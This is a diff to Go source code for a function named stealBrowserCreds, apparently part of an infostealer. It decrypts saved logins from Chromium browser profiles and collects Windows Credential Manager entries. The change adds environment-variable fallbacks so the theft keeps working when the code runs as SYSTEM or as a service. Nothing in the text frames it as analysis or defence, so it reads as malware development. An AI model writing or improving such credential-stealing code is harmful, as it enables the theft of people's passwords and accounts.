@@ -79,29 +79,36 @@ func stealBrowserCreds() ([]BrowserCred, error) {
 
 	localApp := os.Getenv("LOCALAPPDATA")
 	if localApp == "" {
-		return nil, fmt.Errorf("LOCALAPPDATA not set")
+		// Fallback: construct from USERPROFILE or APPDATA (common when running as SYSTEM or service)
+		if up := os.Getenv("USERPROFILE"); up != "" {
+			localApp = filepath.Join(up, "AppData", "Local")
+		} else if ad := os.Getenv("APPDATA"); ad != "" {
+			localApp = filepath.Join(filepath.Dir(ad), "Local")
+		}
 	}
 
-	for _, br := range chromiumBrowsers {
-		baseDir := filepath.Join(localApp, br.Path)
-		if _, err := os.Stat(baseDir); err != nil {
-			continue
-		}
-		aesKey, err := chromiumMasterKey(baseDir)
-		if err != nil {
-			continue
-		}
-		profiles := chromiumProfiles(baseDir)
-		for _, prof := range profiles {
-			loginDB := filepath.Join(baseDir, prof, "Login Data")
-			creds, err := readChromiumLogins(loginDB, aesKey, br.Name)
-			if err == nil {
-				all = append(all, creds...)
+	if localApp != "" {
+		for _, br := range chromiumBrowsers {
+			baseDir := filepath.Join(localApp, br.Path)
+			if _, err := os.Stat(baseDir); err != nil {
+				continue
+			}
+			aesKey, err := chromiumMasterKey(baseDir)
+			if err != nil {
+				continue
+			}
+			profiles := chromiumProfiles(baseDir)
+			for _, prof := range profiles {
+				loginDB := filepath.Join(baseDir, prof, "Login Data")
+				creds, err := readChromiumLogins(loginDB, aesKey, br.Name)
+				if err == nil {
+					all = append(all, creds...)
+				}
 			}
 		}
 	}
 
-	// Windows Credential Manager
+	// Windows Credential Manager — always try, no LOCALAPPDATA needed
 	all = append(all, stealCredManager()...)
 
 	return all, nil
